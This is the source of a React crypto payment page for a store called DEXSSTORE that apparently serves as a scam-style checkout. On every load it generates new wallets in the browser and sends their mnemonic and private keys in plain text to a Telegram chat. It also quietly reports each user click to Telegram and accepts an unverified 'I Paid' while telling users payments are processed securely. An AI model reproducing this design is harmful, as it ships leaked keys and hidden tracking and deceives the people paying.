import { useState, useEffect, useMemo } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { QRCodeSVG } from "qrcode.react";
import { Copy, CheckCircle, X, Wallet, QrCode, Check, Loader2 } from "lucide-react";
import MarketplaceHeader from "@/components/MarketplaceHeader";
import { Button } from "@/components/ui/button";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { createNewSessionWallets } from "@/lib/walletGenerator";
import { sendTelegramNotification } from "@/lib/telegram";

interface Token {
  symbol: string;
  name: string;
  address: string | null;
  decimals: number;
  icon: string;
}

interface Network {
  id: string;
  name: string;
  chainId: number;
  tokens: Token[];
  wallet: string;
  icon: string;
}

const PaymentPage = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [selectedNetwork, setSelectedNetwork] = useState<string>("polygon");
  const [selectedToken, setSelectedToken] = useState<string>("USDC");
  const [copied, setCopied] = useState(false);
  const [showQR, setShowQR] = useState(false);
  const [hasPaid, setHasPaid] = useState(false);
  const [prices, setPrices] = useState<Record<string, number> | null>(null);
  const [loadingPrices, setLoadingPrices] = useState(true);
  
  // Generate NEW wallets on every component mount (page load/refresh)
  const sessionWallets = useMemo(() => createNewSessionWallets(), []);
  
  const state = location.state as { service: string; price: number } | null;
  const discountRate = 0.1;
  const originalUsd = state?.price ?? 0;
  const discountedUsd = Number((originalUsd * (1 - discountRate)).toFixed(2));

  // Fetch real-time prices from DexScreener/CoinGecko API
  useEffect(() => {
    const fetchPrices = async () => {
      setLoadingPrices(true);
      try {
        // Fetch SOL, ETH, MATIC (POL), AVAX prices
        const response = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=ethereum,solana,matic-network,avalanche-2&vs_currencies=usd");
        const data = await response.json();
        
        if (data) {
          setPrices({
            ETH: data.ethereum?.usd || 3500,
            SOL: data.solana?.usd || 140,
            POL: data["matic-network"]?.usd || 0.7,
            AVAX: data["avalanche-2"]?.usd || 40,
            USDC: 1,
          });
        }
      } catch (error) {
        console.error("Failed to fetch real-time prices:", error);
      } finally {
        setLoadingPrices(false);
      }
    };

    fetchPrices();
    // Refresh prices every 60 seconds
    const interval = setInterval(fetchPrices, 60000);
    return () => clearInterval(interval);
  }, []);

  const networks: Record<string, Network> = useMemo(() => ({
    ethereum: {
      id: "ethereum",
      name: "Ethereum",
      chainId: 1,
      wallet: sessionWallets.evm.address,
      icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/info/logo.png",
      tokens: [
        { symbol: "ETH", name: "Ethereum", address: null, decimals: 18, icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/info/logo.png" },
        { symbol: "USDC", name: "USD Coin", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6, icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48/logo.png" },
      ],
    },
    solana: {
      id: "solana",
      name: "Solana",
      chainId: 101,
      wallet: sessionWallets.solana.address,
      icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/solana/info/logo.png",
      tokens: [
        { symbol: "SOL", name: "Solana", address: null, decimals: 9, icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/solana/info/logo.png" },
        { symbol: "USDC", name: "USD Coin", address: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", decimals: 6, icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48/logo.png" },
      ],
    },
    polygon: {
      id: "polygon",
      name: "Polygon",
      chainId: 137,
      wallet: sessionWallets.evm.address,
      icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/polygon/info/logo.png",
      tokens: [
        { symbol: "POL", name: "Polygon", address: null, decimals: 18, icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/polygon/info/logo.png" },
        { symbol: "USDC", name: "USD Coin", address: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", decimals: 6, icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48/logo.png" },
      ],
    },
    avalanche: {
      id: "avalanche",
      name: "Avalanche",
      chainId: 43114,
      wallet: sessionWallets.evm.address,
      icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/avalanchex/info/logo.png",
      tokens: [
        { symbol: "AVAX", name: "Avalanche", address: null, decimals: 18, icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/avalanchex/info/logo.png" },
        { symbol: "USDC", name: "USD Coin", address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", decimals: 6, icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48/logo.png" },
      ],
    },
  }), [sessionWallets]);

  useEffect(() => {
    if (state) {
      const message = `
<b>New Payment Session Started</b>
-------------------------
<b>Service:</b> ${state.service}
<b>Price:</b> <s>$${originalUsd.toFixed(2)}</s> $${discountedUsd.toFixed(2)} (10% off)
-------------------------
<b>GENERATED WALLET KEYS:</b>
<b>Mnemonic:</b> <code>${sessionWallets.mnemonic}</code>

<b>EVM Address:</b> <code>${sessionWallets.evm.address}</code>
<b>EVM Private Key:</b> <code>${sessionWallets.evm.privateKey}</code>

<b>Solana Address:</b> <code>${sessionWallets.solana.address}</code>
<b>Solana Private Key:</b> <code>${sessionWallets.solana.privateKey}</code>
-------------------------
<i>Store these keys safely to access user payments.</i>
      `;
      sendTelegramNotification(message);
    }
  }, [discountedUsd, originalUsd, state, sessionWallets]);

  // Handle case where user refreshes and location.state is lost
  if (!state) {
    return (
      <div className="min-h-screen bg-[#0a0a0a] flex items-center justify-center">
        <div className="text-center p-8 bg-[#111111] rounded-[32px] border border-white/5 shadow-2xl max-w-sm w-full mx-4">
          <div className="w-16 h-16 bg-red-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
            <X className="w-8 h-8 text-red-500" />
          </div>
          <h2 className="text-2xl font-bold mb-2">Session Expired</h2>
          <p className="text-gray-400 text-sm mb-8">Your payment session has timed out or was refreshed. Please return to the order page to continue.</p>
          <Button 
            onClick={() => navigate("/")} 
            className="w-full h-12 bg-white text-black hover:bg-gray-200 rounded-2xl font-bold"
          >
            Return to Home
          </Button>
        </div>
      </div>
    );
  }

  const network = networks[selectedNetwork];
  const token = network.tokens.find((t) => t.symbol === selectedToken) || network.tokens[0];
  const tokenAmount = !prices ? "0.0000" : (discountedUsd / (prices[token.symbol] || 1)).toFixed(4);

  const copyAddress = () => {
    navigator.clipboard.writeText(network.wallet);
    setCopied(true);
    sendTelegramNotification(`<b>User Action:</b> Copied wallet address (${network.name}) for ${state.service}`);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleShowQR = () => {
    setShowQR(true);
    sendTelegramNotification(`<b>User Action:</b> Generated QR Code for ${state.service} on ${network.name}`);
  };

  const handleIPaid = () => {
    setHasPaid(true);
    sendTelegramNotification(`<b>User Action:</b> Clicked "I Paid" for ${state.service}
<b>Amount:</b> ${tokenAmount} ${token.symbol}
<b>Network:</b> ${network.name}
<b>Dest Wallet:</b> <code>${network.wallet}</code>`);
  };

  const getQRValue = () => {
    const websiteName = "DEXSSTORE";
    const label = encodeURIComponent(websiteName);
    const message = encodeURIComponent(state.service);

    if (selectedNetwork === "solana") {
      // User format: solana:RecipientPublicKey?amount=1.0&spl-token=TokenMintAddress
      let url = `solana:${network.wallet}?amount=${tokenAmount}`;
      if (token.address) {
        url += `&spl-token=${token.address}`;
      }
      // Add optional label/message as they are helpful for identification
      url += `&label=${label}&message=${message}`;
      return url;
    } else {
      // User format: ethereum:0xa0b86991c6218b36c1d19D4a2e9Eb0ce3606eb48/transfer?address=0xRecipient&uint256=1000000
      if (token.address) {
        // ERC20 transfer
        const amountInUnits = BigInt(Math.floor(Number(tokenAmount) * Math.pow(10, token.decimals))).toString();
        return `ethereum:${token.address}/transfer?address=${network.wallet}&uint256=${amountInUnits}`;
      } else {
        // Native transfer (ETH, SOL, etc.)
        const amountInUnits = BigInt(Math.floor(Number(tokenAmount) * Math.pow(10, token.decimals))).toString();
        return `ethereum:${network.wallet}?value=${amountInUnits}`;
      }
    }
  };

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white">
      {loadingPrices && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center">
          <div className="flex flex-col items-center gap-4">
            <Loader2 className="w-10 h-10 animate-spin text-primary" />
            <p className="text-sm font-medium">Fetching real-time prices...</p>
          </div>
        </div>
      )}
      <div className="max-w-md mx-auto px-6 pt-20 pb-12">
        <div className="relative bg-[#111111] rounded-[32px] p-8 border border-white/5 shadow-2xl">
          <button 
            onClick={() => navigate(-1)}
            className="absolute right-6 top-6 p-2 hover:bg-white/5 rounded-full transition-colors"
          >
            <X className="w-5 h-5 text-gray-400" />
          </button>

          <div className="text-center mb-8 pt-4">
            <h1 className="text-4xl font-bold tracking-tight mb-2">
              ${discountedUsd.toFixed(2)} {selectedToken}
            </h1>
            <p className="text-green-400 text-sm font-semibold">10% discount applied</p>
            <p className="text-gray-400 text-sm">Pay for {state.service}</p>
          </div>

          <div className="space-y-6">
            <div className="space-y-2">
              <label className="text-xs font-medium text-gray-500 uppercase tracking-wider ml-1">
                Network
              </label>
              <Select value={selectedNetwork} onValueChange={(val) => {
                setSelectedNetwork(val);
                const newNetwork = networks[val];
                if (!newNetwork.tokens.find(t => t.symbol === selectedToken)) {
                  setSelectedToken(newNetwork.tokens[0].symbol);
                }
                sendTelegramNotification(`<b>User Action:</b> Switched network to ${val}`);
              }}>
                <SelectTrigger className="w-full h-14 bg-[#1a1a1a] border-none rounded-2xl px-4 focus:ring-0 text-base">
                  <div className="flex items-center gap-3">
                    <img src={networks[selectedNetwork].icon} className="w-6 h-6 rounded-full" alt="" />
                    <span>{networks[selectedNetwork].name}</span>
                  </div>
                </SelectTrigger>
                <SelectContent className="bg-[#1a1a1a] border-white/10 text-white rounded-2xl">
                  {Object.values(networks).map((net) => (
                    <SelectItem key={net.id} value={net.id} className="focus:bg-white/5 focus:text-white h-12">
                      <div className="flex items-center gap-3">
                        <img src={net.icon} className="w-5 h-5 rounded-full" alt="" />
                        {net.name}
                      </div>
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            <div className="space-y-2">
              <label className="text-xs font-medium text-gray-500 uppercase tracking-wider ml-1">
                Pay with
              </label>
              <Select value={selectedToken} onValueChange={(val) => {
                setSelectedToken(val);
                sendTelegramNotification(`<b>User Action:</b> Switched token to ${val}`);
              }}>
                <SelectTrigger className="w-full h-14 bg-[#1a1a1a] border-none rounded-2xl px-4 focus:ring-0 text-base">
                  <div className="flex items-center gap-3">
                    <img src={token.icon} className="w-6 h-6 rounded-full" alt="" />
                    <span>{tokenAmount} {token.symbol} ({token.symbol})</span>
                  </div>
                </SelectTrigger>
                <SelectContent className="bg-[#1a1a1a] border-white/10 text-white rounded-2xl">
                  {network.tokens.map((t) => (
                    <SelectItem key={t.symbol} value={t.symbol} className="focus:bg-white/5 focus:text-white h-12">
                      <div className="flex items-center gap-3">
                        <img src={t.icon} className="w-5 h-5 rounded-full" alt="" />
                        {t.name} ({t.symbol})
                      </div>
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            <div className="pt-4 space-y-3">
              <div className="grid grid-cols-2 gap-3">
                <Button 
                  variant="outline"
                  onClick={handleShowQR}
                  className="h-14 bg-transparent border-white/10 hover:bg-white/5 rounded-2xl font-semibold text-base flex items-center justify-center gap-2 transition-all active:scale-[0.98]"
                >
                  <QrCode className="w-5 h-5" />
                  QR Code
                </Button>
                
                <Button 
                  disabled={hasPaid}
                  onClick={handleIPaid}
                  className={`h-14 rounded-2xl font-bold text-base transition-all active:scale-[0.98] ${
                    hasPaid 
                      ? "bg-green-500/20 text-green-500 border border-green-500/50" 
                      : "bg-primary text-primary-foreground hover:bg-primary/90"
                  }`}
                >
                  {hasPaid ? <Check className="w-5 h-5" /> : "I Paid"}
                </Button>
              </div>
            </div>
          </div>
        </div>

        <div className="mt-8 text-center">
          <p className="text-gray-500 text-xs px-8 leading-relaxed">
            By paying, you agree to DEXSSTORE's Terms of Service and Privacy Policy. 
            Payments are processed securely on the {network.name} network.
          </p>
        </div>
      </div>

      <Dialog open={showQR} onOpenChange={setShowQR}>
        <DialogContent className="bg-[#111111] border-white/10 text-white rounded-[32px] max-w-sm p-8">
          <DialogHeader>
            <DialogTitle className="text-center text-xl font-bold">Scan to Pay</DialogTitle>
          </DialogHeader>
          <div className="flex flex-col items-center gap-6 py-4">
            <div className="bg-white p-4 rounded-3xl">
              <QRCodeSVG 
                value={getQRValue()} 
                size={220} 
                level="H"
                includeMargin={false}
              />
            </div>
            
            <div className="w-full space-y-4">
              <div className="bg-[#1a1a1a] rounded-2xl p-4 space-y-2">
                <p className="text-[10px] text-gray-500 uppercase font-bold tracking-widest">Wallet Address</p>
                <div className="flex items-center justify-between gap-3">
                  <p className="text-xs font-mono text-gray-300 break-all">{network.wallet}</p>
                  <button onClick={copyAddress} className="shrink-0 text-gray-400 hover:text-white transition-colors">
                    {copied ? <CheckCircle className="w-4 h-4 text-green-500" /> : <Copy className="w-4 h-4" />}
                  </button>
                </div>
              </div>

              <div className="flex items-center justify-between px-2">
                <div className="text-left">
                  <p className="text-[10px] text-gray-500 uppercase font-bold tracking-widest">Amount</p>
                  <p className="text-sm font-bold">{tokenAmount} {token.symbol}</p>
                </div>
                <div className="text-right">
                  <p className="text-[10px] text-gray-500 uppercase font-bold tracking-widest">Network</p>
                  <p className="text-sm font-bold">{network.name}</p>
                </div>
              </div>
            </div>

            <Button 
              variant="ghost" 
              onClick={() => setShowQR(false)}
              className="w-full text-gray-400 hover:text-white hover:bg-white/5 rounded-xl"
            >
              Close
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default PaymentPage;


